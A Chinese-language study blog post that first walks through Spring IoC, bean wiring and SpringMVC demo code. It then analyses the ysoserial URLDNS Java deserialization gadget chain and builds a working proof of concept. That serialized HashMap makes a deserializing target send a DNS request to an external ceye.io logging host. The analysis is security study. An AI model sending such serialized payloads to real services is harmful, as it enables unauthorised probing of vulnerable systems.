<p>下面还是按照mi1k7ea师傅的流程先做一个简单的spring demo。创建spring项目很简单。idea中创建项目里选择spring后下面选择download选项自动下载依赖。之后就会发现依赖包已经在lib文件夹下了。</p>
<p>首先src下建包top.bycsec。新建两个类</p>
<p>HelloWorld</p>
<pre><code class="java">package top.bycsec;

public class HelloWorld {
    private String message;

    public void setMessage(String message){
        this.message  = message;
    }

    public void getMessage(){
        System.out.println(&quot;Your Message : &quot; + message);
    }
}</code></pre>
<p>MainApp</p>
<pre><code class="java">package top.bycsec;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;


public class MainApp {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);
        HelloWorld obj = (HelloWorld) context.getBean(&quot;helloWorld&quot;);
        obj.getMessage();
    }
}</code></pre>
<p>这里我们使用框架的ClassPathXmlApplicationContext()函数来创建应用程序的上下文。这个API加载beans的配置文件并最终基于所提供的API，它处理创建并初始化所有的对象，即在配置文件中提到的beans</p>
<p>同时使用已创建的上下文的getBean()方法来获得所需的bean。这个方法使用bean的ID返回一个最终可以转换为实际对象的通用对象。一旦有了对象，你就可以使用这个对象调用任何类的方法；</p>
<p>那么自然。我们选择加载了beans.xml的配置。所以需要配置beans.xml。</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
&lt;bean id=&quot;helloWorld&quot; class=&quot;top.bycsec.HelloWorld&quot;&gt;
    &lt;property name=&quot;message&quot; value=&quot;byc_404&quot;/&gt;
&lt;/bean&gt;
&lt;/beans&gt;</code></pre>
<p>此处bean 的id自定。但是必须和获取bean时使用getBean()的参数保持一致。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>接下来就spring里的几个基础术语学习下</p>
<ul>
<li>IOC</li>
</ul>
<p>IOC 即 Inversion of Control ,控制反转。指在程序开发中，实例的创建不再由调用者管理，而是由Spring容器创建。Spring容器会负责控制程序之间的关系，而不是由程序代码直接控制，因此控制权由程序代码转移到了Spring容器中，控制权发生了反转，这就是Spring的IoC思想</p>
<p>Spring容器使用依赖注入（DI）来管理组成一个应用程序的组件。这些对象被称为Spring Beans。</p>
<p>即,IoC容器是一个具有依赖注入功能的容器，它可以创建对象，IoC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。</p>
<p>IOC容器的使用很大程度上是为了解决开发过程中,出现一个系统有大量的组件，其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。因此使用了IOC。</p>
<p>同时。控制反转这个概念意味着应用程序只需使用已经配置好的组件，那么”依赖注入”这个概念就随之而出了。我们不是new一个对象。而是注入它到其他组件中。这样我们节省了编写配置代码的时间。同时注入也意味着我们可以将这个组件注入到其他类中。体现了组件共享的简单。</p>
<p>也正因如此。我们要让IOC容器知道怎样配置组件。所以才有了上面的使用xml文件进行bean的配置这一做法。</p>
<p>spring提供了两种IOC容器。一种是我们用过了的<code>ApplicationContext</code>.还有一种是比较轻量的<code>BeanFactory</code>.</p>
<blockquote>
<p>二者的主要区别在于，如果Bean的某一个属性没有注入，则使用BeanFacotry加载后，在第一次调用getBean()方法时会抛出异常，而ApplicationContext则在初始化时自检，这样有利于检查所依赖的属性是否注入。因此，在实际开发中，通常都选择使用ApplicationContext，而只有在系统资源较少时才考虑使用BeanFactory。</p>
</blockquote>
<p>具体用法跟上面的demo没有区别。只是实例化类的区别。因此不再提及。</p>
<p>如果要把上面的流程再仔细分析下的话。其实第一句<code>ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);</code>是加载了bean的配置文件。并且初始化好对象。第二句则使用<code>getBean()</code>这个方法通过配置文件中的 beanid返回真正的对象并使用其调用任何方法。</p>
<ul>
<li>bean</li>
</ul>
<p>Bean是一个被实例化、组装、并通过Spring IoC容器所管理的对象。这些Bean是由用容器提供的配置元数据创建的，例如前面看到的在XML的表单中的定义。</p>
<p>demo中出现的几个bean的元素</p>
<pre><code>id     是一个 Bean 的唯一标识符，Spring 容器对 Bean 的配置和管理都通过该属性完成
class 该属性指定了 Bean 的具体实现类，它必须是一个完整的类名，使用类的全限定名
property &lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 Set 方法完成属性赋值，从而完成依赖注入。该元素的 name 属性指定 Bean 实例中的相应属性名</code></pre><p>因此上面bean的xml配置其实是做了这样的注入的</p>
<pre><code class="java">HelloWorld a= new HelloWorld();
a.setMessage(&quot;byc_404&quot;);</code></pre>
<p>spring中实例化bean除了简单的使用构造方法的构造器实例化。还有静态工厂实例化,实例工厂方式实例化。这些我个人认为可以暂时不用深入了解。主要还是理解了IOC,依赖注入这样的理念。用起来就有明确的思路了。</p>
<ul>
<li>bean装配</li>
</ul>
<p>前面似乎一直在说得使用xml文件进行bean的指定。但实际上可以不使用xml进行配置。xml配置实际可能存在难以维护的缺点。因此可以使用其他方法进行装配。</p>
<p>可以使用Annotation来进行配置。<br>常用的几个注解</p>
<pre><code>@Required @Required注释应用于bean属性的setter方法，它表明受影响的bean属性在配置时必须放在XML配置文件中
@Component 可以使用此注解描述Spring中的Bean，但它是一个泛化的概念，仅仅表示一个组件（Bean），并且可以作用在任何层次。使用时只需将该注解标注在相应类上即可。
@Repository 用于将数据访问层（DAO层）的类标识为Spring中的Bean，其功能与@Component 相同。
@Service 通常作用在业务层（Service 层），用于将业务层的类标识为Spring中的Bean，其功能与@Component相同。
......</code></pre><p>通常我们在类中注明了相关的annotation后，beans.xml配置如下</p>
<pre><code class="xml">?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context
    http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;

    &lt;!--使用context命名空间，通知spring扫描指定目录，进行注解的解析--&gt;
    &lt;context:component-scan base-package=&quot;top.bycsec&quot;/&gt;

&lt;/beans&gt;</code></pre>
<p>这样就会在选定的包里自动寻找bean了。</p>
<p>同样我们还可以自动装配bean.</p>
<p>TextEditor</p>
<pre><code class="java">package top.bycsec;

public class TextEditor {
    private SpellChecker spellChecker;
    private String name;

    public void setSpellChecker( SpellChecker spellChecker ) {
        this.spellChecker = spellChecker;
    }
    public SpellChecker getSpellChecker() {
        return spellChecker;
    }
    public void setName(String name) {
        this.name = name;
    }
    public String getName() {
        return name;
    }
    public void spellCheck() {
        spellChecker.checkSpelling();
    }
}</code></pre>
<p>SpellChecker</p>
<pre><code class="java">package top.bycsec;

public class SpellChecker {
    public SpellChecker(){
        System.out.println(&quot;Inside SpellChecker constructor.&quot; );
    }
    public void checkSpelling() {
        System.out.println(&quot;Inside checkSpelling.&quot; );
    }
}</code></pre>
<p>MainApp</p>
<pre><code class="java">package top.bycsec;

import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

public class MainApp {
    public static void main(String[] args) {
        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);
        TextEditor te = (TextEditor) context.getBean(&quot;textEditor&quot;);
        te.spellCheck();
    }
}</code></pre>
<p>beans.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context
    http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;

    &lt;!-- Definition for textEditor bean --&gt;
    &lt;bean id=&quot;textEditor&quot; class=&quot;top.bycsec.TextEditor&quot; autowire=&quot;byName&quot;&gt;
        &lt;property name=&quot;name&quot; value=&quot;byc_404&quot; /&gt;
    &lt;/bean&gt;

    &lt;!-- Definition for spellChecker bean --&gt;
    &lt;bean id=&quot;spellChecker&quot; class=&quot;top.bycsec.SpellChecker&quot; /&gt;

&lt;/beans&gt;</code></pre>
<p>注意这里我们使用自动装配,也就是配置bean的autowire属性。比如此处的byName就是指：    根据 Property 的 name 自动装配，如果一个 Bean 的 name 和另一个 Bean 中的 Property 的 name 相同，则自动装配这个 Bean 到 Property 中。这里我们textEditor这个bean定义设置为自动装配byName，并且它包含spellChecker属性（即它有一个 setSpellChecker(…) 方法），那么Spring就会查找定义名为spellChecker的bean，并且用它来设置这个属性<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/27.PNG" class="lazyload" data-srcset="27.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>如果我们不用自动调用。那么beans.xml中的配置就需要额外设置property</p>
<pre><code class="xml">&lt;bean id=&quot;textEditor&quot; class=&quot;top.bycsec.TextEditor&quot;&gt;
    &lt;property name=&quot;spellChecker&quot; ref=&quot;spellChecker&quot; /&gt;
    &lt;property name=&quot;name&quot; value=&quot;byc_404&quot; /&gt;
&lt;/bean&gt;</code></pre>
<p>同理。我们还可以使用byType等autowire属性值来进行自动装配。</p>
<p>今天先看到这。spring的内容还是比较多的</p>
<h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>今天简单写个springmvc的demo。其实看了眼廖雪峰老师的spring教程。发现spring的项目基本都是maven构建的。实际上我们就算单纯使用idea中springmvc开发，也可以加入maven结构。</p>
<p>我个人看了下网上csdn的几种写法。有点惊讶有的根本没有写出mvc的作用,有的方法完全拘泥于原来servlet的写法,没有用上spring自己的依赖。最后找到一个阿里云的demo才真正理解了其结构。下面来实际操作下。</p>
<p>首先idea创建springmvc项目。当然刚刚提到了创建maven项目然后引入spring依赖也是可以的。这里我们就暂且先使用idea来帮助我们直接处理好spring的依赖吧。</p>
<p>刚创建完项目首先要注意一点。需要在ProjectStructure =&gt; Artifact 中将两个spring的依赖加入到WEB-INF/lib中。否则待会我们使用tomcat部署时会报错。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/28.PNG" class="lazyload" data-srcset="28.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>接下来先用不加注解的方法写一个class。</p>
<pre><code class="java">package top.bycsec;


import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


public class Helloworld implements Controller {
    @Override
    public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject(&quot;name&quot;,&quot;byc_404&quot;);
        modelAndView.setViewName(&quot;hello&quot;);
        return modelAndView;
    }
}</code></pre>
<p>底下addObject是加载模型数据。setViewName则是选定模型视图。这里视图不使用hello.jsp而是hello是方便书写。我们后面直接在配置中定义后缀即可。</p>
<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page isELIgnored=&quot;false&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Hello World&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
Hello ${name}
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>hello.jsp 使用SpEL表达式。即获取我们刚刚的模型数据输出到视图。<br>然后是项目创建时自动生成的dispatcher-servlet.xml。这里可以修改我们bean的相关参数。比如此处设置路由<code>/helloworld</code>。利用beanid让其对应class为HelloWorld.以及视图是在web根目录下找后缀为jsp的文件。<br>配置文件bean部分如下。</p>
<pre><code class="xml">&lt;bean id=&quot;handlerMapping&quot; class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;
        &lt;property name=&quot;mappings&quot;&gt;
            &lt;props&gt;
                &lt;prop key=&quot;/helloworld&quot;&gt;testHandler&lt;/prop&gt;
            &lt;/props&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id=&quot;testHandler&quot; class=&quot;top.bycsec.Helloworld&quot;&gt;&lt;/bean&gt;
    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
        &lt;property name=&quot;prefix&quot;&gt;
            &lt;value&gt;/&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name=&quot;suffix&quot;&gt;
            &lt;value&gt;.jsp&lt;/value&gt;
        &lt;/property&gt;
    &lt;/bean&gt;</code></pre>
<p>之后加载tomcat配置跑起来即可。访问根目录是index.jsp内容。访问<code>/helloworld</code>则是hello.jsp<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/29.PNG" class="lazyload" data-srcset="29.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>当然。这种写法肯定是麻烦了。刚好昨天学过了spring 中自动装载bean的用法。那么此处当然也可以利用注解+配置自动装载bean</p>
<p>新写一个AnnotationHandler类。这里使用注解<code>@Controller</code>将其置为控制器。同时设定其路由为<code>/mdoel</code>。数据与视图跟刚刚差不多。</p>
<pre><code class="java">package top.bycsec;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class AnnotationHandler {

    @RequestMapping(&quot;/model&quot;)
    public ModelAndView  modelAndViewTest(){
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.addObject(&quot;name&quot;,&quot;byc_404&quot;);
        modelAndView.setViewName(&quot;show&quot;);
        return modelAndView;
    }
}
</code></pre>
<p>show.jsp</p>
<pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
&lt;%@ page isELIgnored=&quot;false&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Model&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
Testing model by ${name}
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>dispatcher-servlet.xml</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;
    &lt;context:component-scan base-package=&quot;top.bycsec&quot;&gt;&lt;/context:component-scan&gt;
    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
        &lt;property name=&quot;prefix&quot;&gt;
            &lt;value&gt;/&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name=&quot;suffix&quot;&gt;
            &lt;value&gt;.jsp&lt;/value&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
&lt;/beans&gt;</code></pre>
<p>直接扫描top.bycsec包十分方便。现在我们访问<code>/model</code>路由<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/30.PNG" class="lazyload" data-srcset="30.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>最终项目路径<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/31.PNG" class="lazyload" data-srcset="31.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>如果要在上面基础上接受参数或者设置路由基本跟servlet差不多</p>
<pre><code class="java">@Controller
@RequestMapping(&quot;/user&quot;)
public class UserController {
    // 实际URL映射是/user/profile
    @GetMapping(&quot;/profile&quot;)
    public ModelAndView profile() {
        ...
    }

    // 实际URL映射是/user/changePassword
    @GetMapping(&quot;/changePassword&quot;)
    public ModelAndView changePassword() {
        ...
    }

    @PostMapping(&quot;/signin&quot;)
    public ModelAndView doSignin(
        @RequestParam(&quot;email&quot;) String email,
        @RequestParam(&quot;password&quot;) String password,
        HttpSession session) {
    ...
    }
}</code></pre>
<p>假如编写的是大量接口的代码(rest api)。spring还提供了<code>@RestController</code>来代替<code>@Controller</code>.这样接口的方法自动变成api方法。数据也是restapi的json数据。</p>
<h2 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h2><p>这一部分用于学习java代码审计中一些常见漏洞的深层原理。比如之前反序列化中利用链的深层原因还没有全部学清楚。一些特定情况下的payload编写也还需要基础知识作为底层支持。</p>
<p>真正接触了实战才会发现java在现在仍旧是建站的首选，并且往往可以拿到权限较高的shell.也幸好最近接触java相对更多了点，所以才有胆量去探究这些漏洞利用的底层。</p>
<h3 id="deserialization-gadgets"><a href="#deserialization-gadgets" class="headerlink" title="deserialization gadgets"></a>deserialization gadgets</h3><p>先从ysoserialpayload利用链的原理开始审计。</p>
<p>根据我们最早学习到的java反序列化原理。我们知道,序列化利用类必须是实现了Serializable的。这些都是payload可行的必要条件。所以后续这种细节都不必提。</p>
<ul>
<li>URLDNS</li>
</ul>
<p>URLDNS常用于检测反序列化漏洞。原因很简单:<br>1.依赖原生类Hashmap<br>2.不依赖jdk版本</p>
<p>我们看看Hashmap类。它实现了readObject方法</p>
<pre><code class="java">private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
                                            loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings &lt; 0)
        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
                                            mappings);
    else if (mappings &gt; 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
                    DEFAULT_INITIAL_CAPACITY :
                    (fc &gt;= MAXIMUM_CAPACITY) ?
                    MAXIMUM_CAPACITY :
                    tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
                        (int)ft : Integer.MAX_VALUE);

        // Check Map.Entry[].class since it&#39;s the nearest public type to
        // what we&#39;re actually creating.
        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})
        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i &lt; mappings; i++) {
            @SuppressWarnings(&quot;unchecked&quot;)
                K key = (K) s.readObject();
            @SuppressWarnings(&quot;unchecked&quot;)
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}</code></pre>
<p>关键在最后一行的putval。我们先看向putval中使用了的hash方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/32.PNG" class="lazyload" data-srcset="32.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>里面hashCode方法取决于你的key的类。此处是java.net.URL类。</p>
<pre><code class="java">public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}</code></pre>
<p>而跟进这里的handler发现调用的是java.net.URLStreamHandler的hashCode。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/33.PNG" class="lazyload" data-srcset="33.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>看到<code>getHostAddress</code>.就能明白此处肯定是对域名进行了解析。所以会发出DNS请求。</p>
<p>不过。URLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。<code>hashCode</code>方法里强调如果hashCode不为-1,则直接返回hashCode.而url类中它是默认为-1的。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/34.PNG" class="lazyload" data-srcset="34.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>刚刚我们说，触发点在<code>putVal</code>那里。它的key是通过readObject读取出来的。那说明我们的key写入时是通过writeObject写入的。按照这个线路跟下去,会发现key值最终来自HashMap中table的值。而HashMap 中的table即hash表是通过hashmap.put来写入数据的。</p>
<pre><code class="java">public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}</code></pre>
<p>这里也调用了hash。那么说明这里也会触发dns请求</p>
<p>我们可以写个demo<br>URLDNS的payload编写并非这么简单的一个调用就完事了的。刚刚上面我们看到。<code>hashCode</code>方法里强调如果hashCode不为-1,则直接返回hashCode.<br>所以本地写要将put的第二个参数设为-1才会发出dns请求。</p>
<pre><code class="java">package top.bycsec;

import java.util.HashMap;
import java.net.URL;

public class exp {

    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(&quot;http://byc.xxx.ceye.io/&quot;);
        map.put(url,-1); 
    }

}</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/35.PNG" class="lazyload" data-srcset="35.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>我们如果只想在对方机器上检测是否产生dns请求。那么必须得规避掉Hashmap.put这一次调用时里面做出的dns请求。方法也很简单。那就是在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询</p>
<p>这一步可以通过反射来达成。</p>
<pre><code class="java">import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class exp {

    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(&quot;http://byc.59fevd.ceye.io/&quot;);
        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        f.setAccessible(true);
        f.set(url,123);
        System.out.println(url.hashCode());
        map.put(url,123);
    }

}</code></pre>
<p>此时调用url的hashCode结果会返回123.也就是直接返回了我们设置的值,避免了dns查询。</p>
<p>hashCode 这个属性不是 transient 的,而是private的。所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</p>
<p>因此。我们实际的poc如下</p>
<pre><code class="java">package top.bycsec;


import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(&quot;http://byc.59fevd.ceye.io/&quot;);
        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        f.setAccessible(true);
        f.set(url, 123);
        map.put(url, &quot;byc_404&quot;);
        f.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
        oos.writeObject(map);
        oos.close();
    }
}</code></pre>
<p>这样就成功将序列化数据写入out.bin,并且没有本地发出dns请求。然后我们模拟真实场景触发</p>
<pre><code class="java">package top.bycsec;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class exp {

    public static void main(String[] args) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
        ois.readObject();
        ois.close();
    }

}</code></pre>
<p>在p1g3师傅的文章里还对ysoserial的payload进行了分析。我们不妨也看看yso的jar包中是如何书写的(其实直接去看github上源码可以配合注释更好阅读)</p>
<pre><code class="java">public Object getObject(String url) throws Exception {
    URLStreamHandler handler = new URLDNS.SilentURLStreamHandler();
    HashMap ht = new HashMap();
    URL u = new URL((URL)null, url, handler);
    ht.put(u, url);
    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);
    return ht;
}
static class SilentURLStreamHandler extends URLStreamHandler {
    SilentURLStreamHandler() {
    }

    protected URLConnection openConnection(URL u) throws IOException {
        return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
        return null;
    }
}</code></pre>
<p>jar包反编译看不出提示。我们在github源码上则可以找到作者的说法</p>
<pre><code class="java">//Avoid DNS resolution during payload creation
                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
URLStreamHandler handler = new SilentURLStreamHandler();</code></pre>
<p>配合上面的源码。我们知道这里它新建了一个子类SilentURLStreamHandler继承URLStreamHandler。那当它在URLDNSpayload里调用put时是直接调用自定义的<code>getHostAddress</code>.这个方法返回null.</p>
<p>而当反序列化执行时,因为这里的SilentURLStreamHandler属性被设置为transient，<strong>而被transient修饰的变量无法被序列化</strong>，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。</p>
<p>到此为止。我们完成了整条urldns链的分析。<br>gadgets如下</p>
<pre><code>HashMap#readObject
    HashMap#hash
